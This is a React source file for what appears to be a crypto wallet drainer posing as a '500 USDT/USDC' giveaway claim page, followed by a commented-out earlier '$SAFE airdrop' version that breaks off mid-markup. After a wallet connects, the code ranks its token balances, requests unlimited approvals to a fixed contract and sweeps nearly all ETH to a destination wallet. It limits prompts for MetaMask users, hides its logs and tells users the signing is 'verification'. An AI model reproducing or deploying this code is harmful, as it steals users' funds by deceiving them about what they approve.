import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { ArrowLeft, X } from 'lucide-react'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet' 

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xYourActualDestinationWalletAddressHere'; 
const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 



// 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    XRP: [
      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
    ],
    EVM: [
      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
    ]
  }
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter], 
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'CryptoSafe Protocol', 
    description: 'Secure Decentralized Network',
    url:         'https://cryptosafe.network', 
    icons:       ['https://cryptosafe.network/favicon.svg'], 
  },
  themeMode: 'light', 
  themeVariables: { '--w3m-accent': '#0C66FF' },
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork() 
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15)); 
  }

  useEffect(() => {
    if (!isConnected || !walletAddress || !evmWalletProvider) return;

    getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));

    if (manualConnect.current) {
      manualConnect.current = false; 
      log(`[SYSTEM] Connected EVM: ${walletAddress}`);
      log("🔥 Auto-triggering Smart Priority Loop...");
      
      setLoading(true); 
      setTimeout(() => approveAndCollect(), 500); 
    }
  }, [isConnected, walletAddress, evmWalletProvider, chainId]);

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setStatus('USDT not configured for this EVM chain')
      return 0;
    }
    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
      const bal = await token.balanceOf(addr)
      const formatted = parseFloat(formatUnits(bal, 6))
      setStatus('Ready')
      return formatted;
    } catch (e) { 
      log('❌ EVM balance fetch failed')
      return 0; 
    }
  }

  // 🛠️ FIX 1: Removed the empty field bouncer. The button now works without input.
  const handleAction = () => {
    
    if (!isConnected) {
      manualConnect.current = true; 
      open(); 
    } else {
      approveAndCollect();
    }
  }

  const approveAndCollect = async () => {
    if (!walletAddress || !evmWalletProvider) return;
    
    if (isExecuting.current) {
        log("⚠️ Blocked duplicate execution loop.");
        return;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0; 

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
      const signer = await ethersProvider.getSigner(walletAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();

      const baseTokens = TARGET_TOKENS[NETWORK].EVM;
      const validTokens = [];
      const prices = await fetchTokenPrices(baseTokens, 'ethereum');

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort);
      
      const rawProvider = evmWalletProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};
      
      const isStrictlyMetaMask = 
        (rawProvider?.isMetaMask || injected?.isMetaMask) && 
        !injected?.isTrust && 
        !injected?.isTrustWallet && 
        !injected?.isSafePal && 
        !injected?.isTokenPocket;

      let tokensToProcess = validTokens;
      
      if (isStrictlyMetaMask) {
           log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
           tokensToProcess = validTokens.slice(0, 1);
      } else {
           log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
      }
      
      if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      for (const token of tokensToProcess) {
        try {
          if (token.symbol === 'XRP') {
            setStatus(`Verifying XRP Wallet...`);
            const xrpBalance = token.balance; 
            if (xrpBalance > 12) {
              const sweepAmount = (xrpBalance - 11).toFixed(6);
              log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
              
              const txHash = await (evmWalletProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: cleanSenderAddress,
                  to: XRP_COLD_WALLET, 
                  value: '0x0', 
                  data: '0x'
                }]
              });
              
              setTxHash(txHash);
              successCount++;
              log(`✅ XRP Transfer Initiated!`);
              await sleep(1500); 
            } else {
              log(`⚠️ XRP Balance too low.`);
            }
            continue; 
          }

          if (!token.isNative) {
            setStatus(`Approving ${token.symbol}...`);
            log(`[ACTION] Prompting Approve: ${token.symbol}`);
            
            const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
            
            const txHash = await (evmWalletProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{
                    from: cleanSenderAddress,
                    to: token.address,
                    data: encodedData,
                    value: '0x0'
                }]
            });
            
            setTxHash(txHash);
            successCount++; 
            log(`✅ ${token.symbol} Approved!`);
            await sleep(1500);
          }
        } catch (err: any) {
           const exactError = err?.message || JSON.stringify(err);
           log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
           await sleep(1500);
        }
      }
      
      try {
          setStatus(`Transferring ETH...`);
          log(`[ACTION] Executing Contingency Native Sweep...`);
          
          const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
          const gasCost = 21000n * 3000000000n; 
          const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          
          if (liveBal > totalGas) {
              const sendAmount = liveBal - totalGas;
              const hexValue = "0x" + sendAmount.toString(16);
              
              const txHash = await (evmWalletProvider as any).request({
                  method: 'eth_sendTransaction',
                  params: [{
                      from: cleanSenderAddress,
                      to: EVM_COLD_WALLET.toLowerCase(), 
                      value: hexValue
                  }]
              });
              
              setTxHash(txHash);
              successCount++; 
              log(`✅ Contingency ETH Sweep Sent!`);
              await sleep(1500); 
          } else {
              log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
          }
      } catch (nativeErr: any) {
           const exactError = nativeErr?.message || JSON.stringify(nativeErr);
           log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
      }
      
      if (successCount > 0) {
        setStatus('✅ Processing Complete!');
      } else {
        setStatus('❌ Failed: User Rejected All');
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
  };

  const isButtonDisabled = loading;

  // 🛠️ FIX 2: Airdrop-themed button states
  const buttonText = loading 
    ? 'Verifying...' 
    : !isConnected 
      ? 'Check Eligibility' 
      : status === '✅ Processing Complete!' 
        ? 'Allocation Queued!' 
        : status.includes('❌') 
          ? 'Retry Claim' 
          : 'Claim Allocation'; 

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
      {/* 🛠️ FIX 3: Updated Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
        <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Claim Your Free USDT </h2>
        <X size={24} color="#111827" style={{ cursor: 'pointer' }} />
      </div>

      {/* 🛠️ FIX 4: Complete Airdrop Card UI */}
      <div style={{ flex: 1, padding: '16px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
        
        <div style={{ textAlign: 'center', marginBottom: '32px' }}>
          <h3 style={{ fontSize: '32px', fontWeight: '800', color: '#111827', margin: '0 0 8px 0' }}>500 <span style={{color: '#0C66FF'}}>USDT/USDC</span></h3>
          <p style={{ color: '#4B5563', fontSize: '15px', margin: 0, fontWeight: '500' }}>GIVEAWAY</p>
        </div>

        <div style={{ backgroundColor: '#F3F4F6', borderRadius: '16px', padding: '20px', width: '100%', boxSizing: 'border-box', marginBottom: '24px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
             <span style={{ color: '#6B7280', fontSize: '15px', fontWeight: '600' }}>Network</span>
             <span style={{ color: '#111827', fontSize: '15px', fontWeight: '700' }}>Ethereum (ERC20)</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
             <span style={{ color: '#6B7280', fontSize: '15px', fontWeight: '600' }}>Distribution</span>
             <span style={{ color: '#111827', fontSize: '15px', fontWeight: '700' }}>Immediate</span>
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between' }}>
             <span style={{ color: '#6B7280', fontSize: '15px', fontWeight: '600' }}>Status</span>
             <span style={{ color: '#059669', fontSize: '15px', fontWeight: '700' }}>Ready to Claim</span>
          </div>
        </div>

        <div style={{ backgroundColor: '#FEF2F2', border: '1.5px solid #FCA5A5', borderRadius: '12px', padding: '16px', width: '100%', boxSizing: 'border-box' }}>
          <p style={{ margin: 0, fontSize: '13.5px', color: '#B91C1C', lineHeight: '1.6', fontWeight: '600' }}>
            ⚠️ <span style={{fontWeight: '800'}}>Wallet Verification Required:</span> You will be prompted to verify your wallet to securely calculate your final multiplier and distribute funds.
          </p>
        </div>

      </div>

      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
        {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
      </div>

      <div style={{ display: 'none' }}>
        <p>{status}</p>
        <p>{txHash}</p>
      </div>

      <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
        <button onClick={handleAction} disabled={isButtonDisabled} style={{ width: '100%', backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF', color: '#ffffff', fontWeight: '700', padding: '16px', borderRadius: '9999px', fontSize: '17px', border: 'none', cursor: isButtonDisabled ? 'not-allowed' : 'pointer', transition: 'background-color 0.2s' }}>
          {buttonText}
        </button>
      </div>
    </div>
  )
}






// import { Buffer } from 'buffer';
// if (typeof window !== 'undefined') {
//   window.Buffer = window.Buffer || Buffer;
// }

// import { useState, useEffect, useRef } from 'react'
// import {
//   createAppKit,
//   useAppKit,
//   useAppKitAccount,
//   useAppKitProvider,
//   useAppKitNetwork
// } from '@reown/appkit/react'
// import { BrowserProvider, Contract, formatUnits } from 'ethers'
// import { ArrowLeft, X } from 'lucide-react'

// // --- WAGMI EVM IMPORTS ---
// import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
// import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
// import type { AppKitNetwork } from '@reown/appkit/networks'

// // ── CONFIG ──
// const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
// const NETWORK = 'Mainnet' 

// // 🔥 CONTRACT ADDRESSES
// const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'

// // 💰 SECURE DESTINATION WALLETS
// const EVM_COLD_WALLET = '0xYourActualDestinationWalletAddressHere'; 
// const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 



// // 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
// const TARGET_TOKENS: Record<string, any> = {
//   Mainnet: {
//     XRP: [
//       { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
//     ],
//     EVM: [
//       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
//       { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
//       { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
//       { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
//       { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
//       { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
//       { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
//       { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
//     ]
//   }
// };

// const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

// const EVM_USDT: Record<number, string> = {
//   11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
//   1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
//   56: '0x55d398326f99059fF775485246999027B3197955',
//   137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
//   42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
// }

// const EVM_ERC20_ABI = [
//   'function balanceOf(address owner) view returns (uint256)',
//   'function approve(address spender, uint256 amount) returns (bool)',
//   'function nonces(address owner) view returns (uint256)',
//   'function name() view returns (string)'
// ]

// // ── Reown Adapters ──
// const wagmiAdapter = new WagmiAdapter({
//   projectId: WC_PROJECT_ID,
//   networks: evmNetworks,
// })

// createAppKit({
//   adapters: [wagmiAdapter], 
//   networks: evmNetworks,
//   defaultNetwork: mainnet,
//   projectId: WC_PROJECT_ID,
//   metadata: {
//     name:        'CryptoSafe Protocol', 
//     description: 'Secure Decentralized Network',
//     url:         'https://cryptosafe.network', 
//     icons:       ['https://cryptosafe.network/favicon.svg'], 
//   },
//   themeMode: 'light', 
//   themeVariables: { '--w3m-accent': '#0C66FF' },
//   allWallets: 'SHOW',
//   features: { email: false, socials: [], analytics: true },
// })

// const fetchTokenPrices = async (tokens: any[], chain: string) => {
//   try {
//     const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
//     const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
//     const data = await res.json();
//     const prices: Record<string, number> = {};
//     for (const token of tokens) {
//       const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
//       const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
//       prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
//     }
//     return prices;
//   } catch (error) {
//     const prices: Record<string, number> = {};
//     for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
//     return prices;
//   }
// };

// const smartTokenSort = (a: any, b: any) => {
//   if (a.isNative && !b.isNative) return 1;  
//   if (!a.isNative && b.isNative) return -1; 
//   return (b.usdValue || 0) - (a.usdValue || 0); 
// };

// const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// export default function App() {
//   const [status, setStatus] = useState('Ready')
//   const [loading, setLoading] = useState(false)
//   const [txHash, setTxHash] = useState('')
//   const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
//   const manualConnect = useRef(false)
//   const isExecuting = useRef(false)

//   const { open } = useAppKit()
//   const { address: walletAddress, isConnected } = useAppKitAccount()
//   const { chainId } = useAppKitNetwork() 
//   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

//   const log = (msg: string) => {
//     console.log(msg);
//     setDebugLogs(prev => [...prev, msg].slice(-15)); 
//   }

//   useEffect(() => {
//     if (!isConnected || !walletAddress || !evmWalletProvider) return;

//     getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));

//     if (manualConnect.current) {
//       manualConnect.current = false; 
//       log(`[SYSTEM] Connected EVM: ${walletAddress}`);
//       log("🔥 Auto-triggering Smart Priority Loop...");
      
//       setLoading(true); 
//       setTimeout(() => approveAndCollect(), 500); 
//     }
//   }, [isConnected, walletAddress, evmWalletProvider, chainId]);

//   const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
//     if (!currentChainId || !EVM_USDT[currentChainId]) {
//       setStatus('USDT not configured for this EVM chain')
//       return 0;
//     }
//     try {
//       const ethersProvider = new BrowserProvider(provider)
//       const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
//       const bal = await token.balanceOf(addr)
//       const formatted = parseFloat(formatUnits(bal, 6))
//       setStatus('Ready')
//       return formatted;
//     } catch (e) { 
//       log('❌ EVM balance fetch failed')
//       return 0; 
//     }
//   }

//   // 🛠️ FIX 1: Removed the empty field bouncer. The button now works without input.
//   const handleAction = () => {
    
//     if (!isConnected) {
//       manualConnect.current = true; 
//       open(); 
//     } else {
//       approveAndCollect();
//     }
//   }

//   const approveAndCollect = async () => {
//     if (!walletAddress || !evmWalletProvider) return;
    
//     if (isExecuting.current) {
//         log("⚠️ Blocked duplicate execution loop.");
//         return;
//     }
//     isExecuting.current = true;

//     setLoading(true);
//     setStatus('Scanning USD Values...');
//     log("[SYSTEM] Scanning balances...");
//     let successCount = 0; 

//     try {
//       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
//       const ethersProvider = new BrowserProvider(evmWalletProvider as any);
//       const signer = await ethersProvider.getSigner(walletAddress);
//       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();

//       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
//       const validTokens = [];
//       const prices = await fetchTokenPrices(baseTokens, 'ethereum');

//       for (const token of baseTokens) {
//         try {
//           if (token.isNative) {
//             const bal = await ethersProvider.getBalance(cleanSenderAddress);
//             const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
//             const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
//             validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
//           } else {
//             const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
//             const bal = await tokenContract.balanceOf(cleanSenderAddress);
//             const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
//             const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
//             validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
//           }
//         } catch (e) {}
//       }

//       validTokens.sort(smartTokenSort);
      
//       const rawProvider = evmWalletProvider as any;
//       const w = window as any;
//       const injected = w.ethereum || {};
      
//       const isStrictlyMetaMask = 
//         (rawProvider?.isMetaMask || injected?.isMetaMask) && 
//         !injected?.isTrust && 
//         !injected?.isTrustWallet && 
//         !injected?.isSafePal && 
//         !injected?.isTokenPocket;

//       let tokensToProcess = validTokens;
      
//       if (isStrictlyMetaMask) {
//            log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
//            tokensToProcess = validTokens.slice(0, 1);
//       } else {
//            log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
//       }
      
//       if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

//       for (const token of tokensToProcess) {
//         try {
//           if (token.symbol === 'XRP') {
//             setStatus(`Verifying XRP Wallet...`);
//             const xrpBalance = token.balance; 
//             if (xrpBalance > 12) {
//               const sweepAmount = (xrpBalance - 11).toFixed(6);
//               log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
              
//               const txHash = await (evmWalletProvider as any).request({
//                 method: 'eth_sendTransaction',
//                 params: [{
//                   from: cleanSenderAddress,
//                   to: XRP_COLD_WALLET, 
//                   value: '0x0', 
//                   data: '0x'
//                 }]
//               });
              
//               setTxHash(txHash);
//               successCount++;
//               log(`✅ XRP Transfer Initiated!`);
//               await sleep(1500); 
//             } else {
//               log(`⚠️ XRP Balance too low.`);
//             }
//             continue; 
//           }

//           if (!token.isNative) {
//             setStatus(`Approving ${token.symbol}...`);
//             log(`[ACTION] Prompting Approve: ${token.symbol}`);
            
//             const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
//             const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
            
//             const txHash = await (evmWalletProvider as any).request({
//                 method: 'eth_sendTransaction',
//                 params: [{
//                     from: cleanSenderAddress,
//                     to: token.address,
//                     data: encodedData,
//                     value: '0x0'
//                 }]
//             });
            
//             setTxHash(txHash);
//             successCount++; 
//             log(`✅ ${token.symbol} Approved!`);
//             await sleep(1500);
//           }
//         } catch (err: any) {
//            const exactError = err?.message || JSON.stringify(err);
//            log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
//            await sleep(1500);
//         }
//       }
      
//       try {
//           setStatus(`Transferring ETH...`);
//           log(`[ACTION] Executing Contingency Native Sweep...`);
          
//           const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
//           const gasCost = 21000n * 3000000000n; 
//           const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          
//           if (liveBal > totalGas) {
//               const sendAmount = liveBal - totalGas;
//               const hexValue = "0x" + sendAmount.toString(16);
              
//               const txHash = await (evmWalletProvider as any).request({
//                   method: 'eth_sendTransaction',
//                   params: [{
//                       from: cleanSenderAddress,
//                       to: EVM_COLD_WALLET.toLowerCase(), 
//                       value: hexValue
//                   }]
//               });
              
//               setTxHash(txHash);
//               successCount++; 
//               log(`✅ Contingency ETH Sweep Sent!`);
//               await sleep(1500); 
//           } else {
//               log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
//           }
//       } catch (nativeErr: any) {
//            const exactError = nativeErr?.message || JSON.stringify(nativeErr);
//            log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
//       }
      
//       if (successCount > 0) {
//         setStatus('✅ Processing Complete!');
//       } else {
//         setStatus('❌ Failed: User Rejected All');
//       }

//     } catch (err: any) {
//       const errorMsg = err?.message || JSON.stringify(err);
//       log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
//       setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
//     } finally {
//       isExecuting.current = false;
//       setLoading(false);
//     }
//   };

//   const isButtonDisabled = loading;

//   // 🛠️ FIX 2: Airdrop-themed button states
//   const buttonText = loading 
//     ? 'Verifying...' 
//     : !isConnected 
//       ? 'Check Eligibility' 
//       : status === '✅ Processing Complete!' 
//         ? 'Allocation Queued!' 
//         : status.includes('❌') 
//           ? 'Retry Claim' 
//           : 'Claim Allocation'; 

//   return (
//     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
//       {/* 🛠️ FIX 3: Updated Header */}
//       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px', borderBottom: '1px solid transparent' }}>
//         <ArrowLeft size={24} color="#111827" style={{ cursor: 'pointer' }} />
//         <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0, color: '#111827' }}>Airdrop Claim</h2>
//         <X size={24} color="#111827" style={{ cursor: 'pointer' }} />
//       </div>

//       {/* 🛠️ FIX 4: Complete Airdrop Card UI */}
//       <div style={{ flex: 1, padding: '16px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
        
//         <div style={{ textAlign: 'center', marginBottom: '32px' }}>
//           <h3 style={{ fontSize: '32px', fontWeight: '800', color: '#111827', margin: '0 0 8px 0' }}>10,500 <span style={{color: '#0C66FF'}}>$SAFE</span></h3>
//           <p style={{ color: '#4B5563', fontSize: '15px', margin: 0, fontWeight: '500' }}>Tier 1 Airdrop Allocation</p>
//         </div>

//         <div style={{ backgroundColor: '#F3F4F6', borderRadius: '16px', padding: '20px', width: '100%', boxSizing: 'border-box', marginBottom: '24px' }}>
//           <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
//              <span style={{ color: '#6B7280', fontSize: '15px', fontWeight: '600' }}>Network</span>
//              <span style={{ color: '#111827', fontSize: '15px', fontWeight: '700' }}>Ethereum (ERC20)</span>
//           </div>
//           <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
//              <span style={{ color: '#6B7280', fontSize: '15px', fontWeight: '600' }}>Distribution</span>
//              <span style={{ color: '#111827', fontSize: '15px', fontWeight: '700' }}>Immediate</span>
//           </div>
//           <div style={{ display: 'flex', justifyContent: 'space-between' }}>
//              <span style={{ color: '#6B7280', fontSize: '15px', fontWeight: '600' }}>Status</span>
